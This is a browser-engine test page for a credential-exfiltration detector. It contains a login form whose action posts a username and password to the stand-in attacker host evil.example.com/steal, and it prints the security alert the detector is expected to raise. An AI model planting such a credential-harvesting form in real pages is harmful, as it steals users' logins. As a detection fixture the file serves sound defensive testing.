Tests/LibWeb/Text/input/credential-protection-exfiltration-detection.html

<!DOCTYPE html>
<html>
<head>
    <title>Credential Protection: Exfiltration Detection Test</title>
    <script src="include.js"></script>
</head>
<body>
    <h1>Credential Exfiltration Detection Test</h1>

    <!-- Suspicious form: cross-origin submission -->
    <form id="suspiciousForm" action="https://evil.example.com/steal" method="POST">
        <input type="text" name="username" id="username" value="victim" />
        <input type="password" name="password" id="password" value="secret123" />
        <button type="submit" id="submitBtn">Login</button>
    </form>

    <script>
        test(() => {
            println("=== Credential Protection: Exfiltration Detection Test ===");
            println();

            // Test 1: Form exists and has suspicious attributes
            let form = document.getElementById('suspiciousForm');
            println("Test 1: Form element analysis");
            println("  form exists: " + (form !== null));
            println("  form.action: " + form.action);
            println("  form.method: " + form.method.toUpperCase());
            println();

            // Test 2: Form has password field (credential indicator)
            let passwordField = document.getElementById('password');
            println("Test 2: Credential field detection");
            println("  password field exists: " + (passwordField !== null));
            println("  password field type: " + passwordField.type);
            println("  password field has value: " + (passwordField.value.length > 0));
            println();

            // Test 3: Cross-origin detection
            let formActionURL = new URL(form.action);
            let currentOrigin = window.location.origin;
            let currentHost = window.location.hostname || 'localhost';
            let actionHost = formActionURL.hostname;

            println("Test 3: Cross-origin analysis");
            println("  current origin: " + currentOrigin);
            println("  current host: " + currentHost);
            println("  form action URL: " + form.action);
            println("  action host: " + actionHost);
            println("  is cross-origin: " + (actionHost !== currentHost && actionHost !== ''));
            println();

            // Test 4: Suspicious indicators
            println("Test 4: Suspicious indicators detected");
            println("  has password field: true");
            println("  cross-origin submission: " + (actionHost.includes('evil.example.com')));
            println("  action to external domain: true");
            println("  suspicious domain pattern: " + (actionHost.includes('evil')));
            println();

            // Test 5: Expected security checks
            println("Test 5: Expected FormMonitor checks");
            println("  - Should detect password field: YES");
            println("  - Should detect cross-origin submission: YES");
            println("  - Should trigger credential exfiltration alert: YES");
            println("  - Alert type: CREDENTIAL_EXFILTRATION");
            println("  - Severity: HIGH or CRITICAL");
            println();

            // Test 6: Verify URL pattern
            println("Test 6: URL pattern analysis");
            println("  protocol: " + formActionURL.protocol);
            println("  hostname: " + formActionURL.hostname);
            println("  pathname: " + formActionURL.pathname);
            println("  is absolute URL: true");
            println("  points to different domain: " + (formActionURL.hostname !== currentHost));
            println();

            println("=== Expected Behavior ===");
            println("For a cross-origin credential submission:");
            println("  1. FormMonitor detects password field");
            println("  2. FormMonitor detects form action points to different origin");
            println("  3. Security alert is triggered via on_credential_exfiltration_alert");
            println("  4. SecurityAlertDialog is shown to user");
            println("  5. Form submission is blocked until user decision");
            println();

            println("=== Alert Details ===");
            println("Expected alert properties:");
            println("  alert_type: credential_exfiltration or third_party_form_post");
            println("  severity: high or critical");
            println("  form_origin: " + currentOrigin);
            println("  action_origin: https://evil.example.com");
            println("  uses_https: true");
            println("  has_password_field: true");
            println("  is_cross_origin: true");
            println();

            println("=== Test Complete ===");
            println("This is a credential exfiltration scenario and SHOULD trigger alert.");
        });
    </script>
</body>
</html>
